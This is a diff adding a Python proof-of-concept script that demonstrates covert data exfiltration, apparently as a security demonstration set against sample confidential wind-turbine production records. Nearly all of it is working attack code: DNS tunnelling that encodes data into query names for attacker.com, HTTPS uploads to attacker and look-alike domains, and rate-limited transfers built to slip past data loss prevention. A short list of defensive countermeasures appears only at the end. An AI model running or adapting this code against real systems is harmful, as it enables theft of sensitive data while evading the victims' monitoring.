@@ -1,0 +1,241 @@
+#!/usr/bin/env python3
+"""
+Proof of Concept: Covert Data Exfiltration Techniques
+Demonstrates methods to extract data while evading detection
+"""
+
+import dns.resolver
+import base64
+import requests
+import time
+from datetime import datetime
+
+
+def dns_exfiltrate(data, domain="attacker.com"):
+    """
+    Exfiltrate data via DNS queries
+    Each query encodes small amount of data
+    Appears as normal DNS traffic in logs
+    """
+    print(f"[*] DNS Exfiltration to {domain}")
+    print(f"[*] Data size: {len(data)} bytes")
+
+    encoded = base64.b64encode(data.encode()).decode()
+    # Split into 63-character chunks (DNS label limit)
+    chunks = [encoded[i:i + 63] for i in range(0, len(encoded), 63)]
+
+    print(f"[*] Sending {len(chunks)} DNS queries...")
+
+    for i, chunk in enumerate(chunks):
+        query = f"{i}.{chunk}.{domain}"
+        try:
+            # This will fail but the DNS query is logged by attacker's server
+            dns.resolver.resolve(query, 'A')
+        except dns.resolver.NXDOMAIN:
+            pass  # Expected - attacker extracts data from DNS logs
+        except dns.resolver.NoNameservers:
+            pass  # No nameservers available
+        except dns.resolver.Timeout:
+            pass  # Query timeout
+        except dns.exception.DNSException:
+            pass  # Other DNS errors - don't need the exception object
+
+        if (i + 1) % 10 == 0:
+            print(f"    Sent {i + 1}/{len(chunks)} queries")
+
+    print("[*] DNS exfiltration complete")
+    print("[*] Detection evasion: Appears as normal DNS lookups")
+    return len(chunks)
+
+
+def https_exfiltrate(data, server="https://attacker.com/upload"):
+    """
+    Exfiltrate via HTTPS POST
+    Encrypted and looks like normal web browsing
+    """
+    print(f"\n[*] HTTPS Exfiltration to {server}")
+    print(f"[*] Data size: {len(data)} bytes")
+
+    try:
+        files = {'file': ('production_data.csv', data)}
+        # In real scenario, this would succeed
+        response = requests.post(server, files=files, timeout=5)
+        print(f"[*] Upload complete: {response.status_code}")
+        print("[*] Detection evasion: Encrypted, looks like normal web traffic")
+        return response.status_code
+    except requests.exceptions.ConnectionError:
+        print(f"[*] Upload simulated (server not reachable)")
+        print(f"[*] In real attack, data would be uploaded via HTTPS")
+    except requests.exceptions.Timeout:
+        print(f"[*] Upload timeout (would retry in real attack)")
+    except requests.exceptions.RequestException:
+        print(f"[*] Upload failed due to request error")
+
+    print("[*] Detection evasion: Encrypted, looks like normal web traffic")
+    return None
+
+
+def slow_exfiltrate(data, rate_limit_kb_per_hour=100, server="https://attacker.com/upload"):
+    """
+    Exfiltrate slowly to avoid detection
+    Small amounts of data periodically
+    Avoids triggering data loss prevention (DLP) systems
+    """
+    print(f"\n[*] Slow Exfiltration (Rate-limited)")
+    print(f"[*] Total data size: {len(data)} bytes ({len(data) / 1024:.2f} KB)")
+    print(f"[*] Rate limit: {rate_limit_kb_per_hour} KB/hour")
+
+    chunk_size = rate_limit_kb_per_hour * 1024
+    total_chunks = (len(data) + chunk_size - 1) // chunk_size
+
+    hours_required = total_chunks
+    days_required = hours_required / 24
+
+    print(f"[*] Will send {total_chunks} chunks")
+    print(f"[*] Estimated time: {hours_required} hours ({days_required:.1f} days)")
+    print(f"[*] Detection probability: LOW (spread over time)")
+
+    # Simulate sending a few chunks
+    print(f"\n[*] Simulating first 3 chunks...")
+    chunks_sent = 0
+    for i in range(min(3, total_chunks)):
+        start_idx = i * chunk_size
+        end_idx = min(start_idx + chunk_size, len(data))
+        chunk = data[start_idx:end_idx]
+
+        print(f"    [{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Chunk {i + 1}/{total_chunks}: {len(chunk)} bytes")
+
+        try:
+            # In reality, would POST this chunk
+            requests.post(server, data=chunk, timeout=2)
+            chunks_sent += 1
+        except requests.exceptions.ConnectionError:
+            pass  # Server not reachable in demo
+        except requests.exceptions.Timeout:
+            pass  # Timeout in demo
+        except requests.exceptions.RequestException:
+            pass  # Other request errors
+
+        if i < 2:  # Don't wait after last simulation chunk
+            print(f"    Waiting 1 second (would be 1 hour in real attack)...")
+            time.sleep(1)
+
+    print(f"\n[*] Slow exfiltration initiated ({chunks_sent} chunks sent in demo)")
+    print(f"[*] Detection evasion: Traffic blends with normal activity")
+    return total_chunks
+
+
+def demonstrate_covert_channels():
+    """Demonstrate various covert exfiltration techniques"""    # type: ignore
+
+    print("=" * 70)
+    print("[*] Proof of Concept: Covert Data Exfiltration")
+    print("[*] Demonstrates techniques to evade detection")
+    print("=" * 70)
+
+    # Sample sensitive data to exfiltrate
+    sensitive_data = """
+Turbine Performance Data - CONFIDENTIAL
+Date,Turbine_ID,Power_MW,Efficiency_%
+2024-01-15,T001,2.5,94.2
+2024-01-15,T002,2.6,95.1
+2024-01-15,T003,2.4,93.8
+[... thousands more rows ...]
+Total Production: 45.2 GWh
+Average Efficiency: 94.7%
+Maintenance Schedule: Q2 2024
+"""
+
+    print(f"\n[*] Sample data to exfiltrate:")
+    print(f"    Type: Production records")
+    print(f"    Size: {len(sensitive_data)} bytes")
+    print(f"    Value: Trade secrets, competitive intelligence")
+
+    # Method 1: DNS Exfiltration
+    print("\n" + "-" * 70)
+    print("[*] METHOD 1: DNS Tunneling")
+    print("-" * 70)
+    dns_queries_sent = dns_exfiltrate(sensitive_data[:200], "exfil.attacker.com")
+    print(f"[*] Total DNS queries sent: {dns_queries_sent}")
+
+    # Method 2: HTTPS Exfiltration
+    print("\n" + "-" * 70)
+    print("[*] METHOD 2: HTTPS Upload")
+    print("-" * 70)
+    https_exfiltrate(sensitive_data, "https://legit-looking-domain.com/api/upload")
+
+    # Method 3: Slow Exfiltration
+    print("\n" + "-" * 70)
+    print("[*] METHOD 3: Time-Based Rate Limiting")
+    print("-" * 70)
+
+    # Simulate exfiltrating 10 MB at 100 KB/hour
+    large_data_size = 10 * 1024 * 1024  # 10 MB
+    simulated_data = "X" * 1000  # Use small sample for demo
+    chunks_for_demo = slow_exfiltrate(simulated_data, rate_limit_kb_per_hour=100)
+
+    # Calculate for actual large dataset
+    print(f"\n[*] For 10 MB dataset:")
+    hours = (large_data_size / 1024) / 100
+    days = hours / 24
+    total_chunks_for_10mb = (large_data_size // (100 * 1024)) + 1
+    print(f"    Time required: {hours:.0f} hours ({days:.1f} days)")
+    print(f"    Total chunks: {total_chunks_for_10mb}")
+    print(f"    Detection risk: Minimal (blends with background)")
+    print(f"    Demo sent: {chunks_for_demo} chunk(s)")
+
+    # Summary
+    print("\n" + "=" * 70)
+    print("[*] DETECTION EVASION TECHNIQUES SUMMARY")
+    print("=" * 70)
+
+    techniques = [
+        {
+            'method': 'DNS Tunneling',
+            'stealth': 'HIGH',
+            'speed': 'SLOW',
+            'evasion': 'Appears as normal DNS lookups'
+        },
+        {
+            'method': 'HTTPS Upload',
+            'stealth': 'MEDIUM',
+            'speed': 'FAST',
+            'evasion': 'Encrypted, blends with web traffic'
+        },
+        {
+            'method': 'Rate-Limited',
+            'stealth': 'VERY HIGH',
+            'speed': 'VERY SLOW',
+            'evasion': 'Small periodic transfers avoid DLP triggers'
+        },
+        {
+            'method': 'ICMP Tunneling',
+            'stealth': 'HIGH',
+            'speed': 'SLOW',
+            'evasion': 'Hidden in ping packets (not implemented)'
+        },
+        {
+            'method': 'Steganography',
+            'stealth': 'VERY HIGH',
+            'speed': 'MEDIUM',
+            'evasion': 'Hidden in image files (not implemented)'
+        }
+    ]
+
+    print(f"\n{'Method':<20} {'Stealth':<12} {'Speed':<12} {'Evasion Technique'}")
+    print("-" * 70)
+    for t in techniques:
+        print(f"{t['method']:<20} {t['stealth']:<12} {t['speed']:<12} {t['evasion']}")
+
+    print("\n[*] DEFENSIVE COUNTERMEASURES:")
+    print("    • Monitor DNS query volumes and patterns")
+    print("    • Inspect HTTPS traffic via SSL/TLS interception")
+    print("    • Implement data loss prevention (DLP) systems")
+    print("    • Baseline normal traffic patterns")
+    print("    • Monitor for slow, persistent outbound connections")
+    print("    • Restrict outbound connections to approved destinations")
+    print("\n" + "=" * 70)
+
+
+if __name__ == '__main__':
+    demonstrate_covert_channels()
